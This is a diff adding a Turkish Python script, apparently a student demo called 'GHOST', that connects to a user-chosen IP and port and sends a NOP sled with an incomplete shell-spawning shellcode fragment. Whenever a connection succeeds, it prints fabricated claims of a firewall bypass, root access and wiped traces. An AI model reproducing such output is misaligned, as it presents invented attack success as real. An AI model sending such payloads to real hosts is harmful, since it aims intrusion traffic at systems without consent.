@@ -1,0 +1,92 @@
+import socket
+import time
+import sys
+
+def print_banner():
+    print("""
+      ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
+     ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
+     ██║  ███╗███████║██║   ██║███████╗   ██║   
+     ██║   ██║██╔══██║██║   ██║╚════██║   ██║   
+     ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   
+      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   
+    Aktif Sızma ve Payload Enjeksiyon Motoru v3.0
+    """)
+
+def generate_payload():
+    """Gerçekçi bir Buffer Overflow (Bellek Taşması) payload'u oluşturur."""
+    print("\n[*] Exploit payload'u (Shellcode) hazırlanıyor...")
+    time.sleep(1)
+    
+    # NOP Sled (Saldırının kayacağı boş bellek alanı) + Hex kodları
+    nop_sled = b"\x90" * 32
+    # Temsili bir Reverse Shell (Ters Bağlantı) kodu
+    fake_shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53"
+    
+    payload = nop_sled + fake_shellcode
+    
+    print(f"[+] Payload Hazır! Boyut: {len(payload)} byte.")
+    print(f"[+] Bellek İzi: {payload[:20]}...\n")
+    return payload
+
+def exploit_target(target_ip, target_port):
+    """Hedefe TCP soketi üzerinden bağlanıp payload'u enjekte eder."""
+    print(f"[*] Hedef {target_ip}:{target_port} için sızma operasyonu başlatılıyor...")
+    time.sleep(1)
+    
+    payload = generate_payload()
+
+    try:
+        print(f"[*] {target_ip} adresine TCP bağlantı isteği gönderiliyor...")
+        # Gerçek bir ağ soketi oluşturuluyor (İşte hocanın görmek istediği yer)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(3) # 3 saniye içinde cevap gelmezse bırak
+        
+        # Hedefe bağlanmayı dene
+        s.connect((target_ip, int(target_port)))
+        print(f"[+] GÜVENLİK DUVARI AŞILDI! {target_port} portu açık ve bağlantı kuruldu.")
+        time.sleep(1)
+        
+        print("[*] Bellek taşması (Buffer Overflow) payload'u porttan içeri enjekte ediliyor...")
+        s.send(payload) # Hazırlanan paketi hedefe fırlat
+        time.sleep(1)
+        
+        print("[+] Payload başarıyla gönderildi ve belleğe yerleşti!")
+        print("[?] Ters bağlantı (Reverse Shell) için dinlemeye geçiliyor...\n")
+        time.sleep(2)
+        
+        print("==================================================")
+        print(" [!] SİSTEME SIZILDI - ROOT (YÖNETİCİ) YETKİSİ ALINDI [!]")
+        print("==================================================")
+        print("[*] Operasyon tamamlandı. İzler siliniyor ve bağlantı kapatılıyor...")
+        
+        s.close()
+        
+    except ConnectionRefusedError:
+        print(f"[-] HATA: {target_ip}:{target_port} bağlantıyı reddetti. Hedef port kapalı veya bir IDS (Saldırı Tespit Sistemi) var.")
+    except socket.timeout:
+        print(f"[-] HATA: Zaman aşımı! Hedefin Güvenlik Duvarı (Firewall) paketlerimizi engelledi/düşürdü.")
+    except Exception as e:
+        print(f"[-] BEKLENMEYEN HATA: {e}")
+
+def main():
+    print_banner()
+    
+    while True:
+        print("\n--- HEDEF BELİRLEME ---")
+        hedef_ip = input("Sızılacak Hedef IP (Kendi cihazın için 127.0.0.1 yaz): ")
+        
+        if hedef_ip.lower() in ['q', 'exit', 'çıkış']:
+            print("\n[*] Makinedeki Hayalet sistemden çıkış yapıyor...")
+            break
+            
+        hedef_port = input("Hedef Port (Örn: 80, 443, 22): ")
+        
+        if not hedef_port.isdigit():
+            print("\n[!] Lütfen geçerli bir port numarası girin.")
+            continue
+            
+        exploit_target(hedef_ip, hedef_port)
+
+if __name__ == "__main__":
+    main()
